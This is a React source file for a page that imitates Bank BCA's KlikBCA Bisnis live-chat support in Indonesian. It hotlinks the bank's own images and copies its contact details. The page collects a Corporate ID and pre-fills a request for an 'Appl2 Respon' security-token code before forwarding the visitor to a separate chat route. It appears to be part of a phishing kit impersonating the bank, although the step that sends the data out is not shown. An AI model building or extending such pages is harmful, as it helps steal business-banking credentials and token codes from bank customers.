import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";

export default function ChatPage() {
  const [corporateId, setCorporateId] = useState("");
  const [message, setMessage] = useState("");
  const [selectedQuestion, setSelectedQuestion] = useState<string>("");
  const [, navigate] = useLocation();
  const { toast } = useToast();

  const quickQuestions = [
    "Minta Appl2 Respon KlikBCA Bisnis",
  ];

  const handleQuestionClick = (question: string) => {
    setSelectedQuestion(question);
    setMessage(question);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Store message and corporate ID in localStorage before navigating
    localStorage.setItem("chatInitialMessage", message);
    localStorage.setItem("chatCorporateId", corporateId);

    setTimeout(() => {
      navigate("/live-chat");
    }, 1500);

    setCorporateId("");
    setMessage("");
    setSelectedQuestion("");
  };

  return (
    <div className="flex flex-col min-h-screen">
      <div
        className="flex-1 bg-background relative overflow-hidden"
        style={{
          backgroundImage: `url('https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFIGBGMGGGNCDGFGOGHGLGFGIGOCAHOGHG')`,
          backgroundPosition: "right bottom",
          backgroundRepeat: "no-repeat",
          backgroundAttachment: "fixed",
          backgroundSize: "auto 80%",
        }}
      >
        <div className="relative z-10">
          {/* Header */}
          <div className="flex justify-between items-center px-6 md:px-12 py-4">
            <div className="invisible w-20" />
            <a
              href="/"
              className="text-sm font-medium text-primary hover:opacity-70 transition-opacity"
              data-testid="link-back-to-login"
            >
              ← Kembali ke Login
            </a>
          </div>

          {/* Main content */}
          <div className="px-4 md:pl-32 py-8">
            <div className="max-w-sm">
              {/* Logo Section - Left Aligned */}
              <div className="mb-10">
                <img
                  src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCCGDGBGOCAHOGHG"
                  alt="BCA Logo"
                  className="h-12 mb-4"
                />
                <h1 className="text-2xl font-bold text-primary mb-1">
                  Mulai Dukungan Obrolan Langsung
                </h1>
                <p className="text-sm text-primary font-medium">KeyBCA</p>
              </div>

              {/* Chat Form - Left Aligned */}
              <form onSubmit={handleSubmit} className="space-y-3">
                {/* Corporate ID Field */}
                <div className="space-y-2">
                  <Label htmlFor="corporate_id" className="text-sm font-semibold text-primary">
                    ID Perusahaan
                  </Label>
                  <Input
                    id="corporate_id"
                    type="text"
                    value={corporateId}
                    onChange={(e) => setCorporateId(e.target.value)}
                    placeholder="Masukkan Corporate ID Anda"
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-corporate-id"
                  />
                </div>

                {/* Message Field */}
                <div className="space-y-2">
                  <Label htmlFor="message" className="text-sm font-semibold text-primary">
                    Pertanyaan Anda
                  </Label>
                  <Input
                    id="message"
                    type="text"
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                    placeholder="Ketik pertanyaan atau pilih di bawah"
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-message"
                  />
                </div>

                {/* Quick Question Buttons */}
                <div className="space-y-2 mt-4">
                  <p className="text-xs text-primary font-medium">Pilihan Cepat:</p>
                  <div className="space-y-2">
                    {quickQuestions.map((question) => (
                      <button
                        key={question}
                        type="button"
                        onClick={() => handleQuestionClick(question)}
                        className={`w-full px-3 py-2 text-sm rounded-md border transition-colors text-left ${
                          selectedQuestion === question
                            ? "bg-primary text-white border-primary"
                            : "bg-white text-primary border-gray-300 hover:bg-gray-50"
                        }`}
                        data-testid={`button-question-${question.replace(/\s+/g, "-").toLowerCase()}`}
                      >
                        {question}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  className="w-full h-10 mt-6 rounded-full bg-primary hover:bg-primary/90 text-white font-semibold uppercase tracking-wide text-sm"
                  data-testid="button-start-chat"
                >
                  Mulai Obrolan
                </Button>
              </form>

              {/* Help Section */}
              <div className="mt-8 text-sm text-foreground leading-relaxed">
                <p className="mb-3">
                  Hubungi tim dukungan kami untuk bantuan lebih lanjut atau kunjungi{" "}
                  <a
                    href="https://www.bca.co.id/id/bisnis/layanan/e-banking-bisnis/klikbca-bisnis"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-primary underline font-medium hover:opacity-70"
                  >
                    Informasi KlikBCA Bisnis
                  </a>
                </p>
              </div>

              {/* Contact Information Section */}
              <div className="mt-6 flex gap-6">
                {/* Phone Contact */}
                <a
                  href="tel:1500777"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-phone-chat"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCIGBGMGPGCGDGBGOCAHOGHG"
                    alt="Halo Layanan"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">Halo Layanan</p>
                    <p className="font-semibold text-foreground">KlikBCA Bisnis</p>
                    <p className="text-primary font-bold text-xs">1500777</p>
                  </div>
                </a>

                {/* Email Contact */}
                <a
                  href="mailto:halobca@bca.co.id"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-email-chat"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCFGNGBGJGMGOCAHOGHG"
                    alt="Email"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">Email</p>
                    <p className="text-primary font-bold text-xs">halobca@bca.co.id</p>
                  </div>
                </a>

                {/* Twitter Contact */}
                <a
                  href="https://twitter.com/halobca"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-twitter-chat"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCEHHHJGEHEHFGCHOCAHOGHG"
                    alt="Twitter"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">Twitter</p>
                    <p className="text-primary font-bold text-xs">@HaloBCA</p>
                  </div>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center text-xs py-3" style={{ backgroundColor: "#f2f2f2", color: "#1F6198" }}>
        Copyright © 2020   All Right Reserved
      </div>
    </div>
  );
}
